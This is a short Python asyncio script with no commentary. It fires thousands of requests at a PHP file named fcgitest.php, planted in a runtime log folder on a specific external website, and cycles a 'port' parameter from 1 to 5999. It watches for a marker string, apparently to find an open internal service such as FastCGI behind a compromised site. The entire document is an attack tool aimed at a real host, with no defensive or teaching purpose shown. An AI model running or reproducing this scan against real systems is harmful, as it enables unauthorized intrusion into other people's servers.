import requests
import asyncio
import aiohttp
import time

async def fetch(url):
		async with aiohttp.ClientSession() as session:
				try:
					error_url = []
					async with session.get(url,timeout=50) as resp:
						content = (await resp.text())
						if 'watch_dog' in str(content):
								print('success:'+url)
								exit()
						else:
								print('fail:'+url)
				except Exception as e:
						print(e)
						pass
					
url = "http://www.suixd4yings.biz/runtime/log/201911/fcgitest.php?port="
task = [fetch(url+str(i)) for i in range(1,6000)]
loop = asyncio.get_event_loop()
loop.run_until_complete(asyncio.wait(task))
print('end')					
								
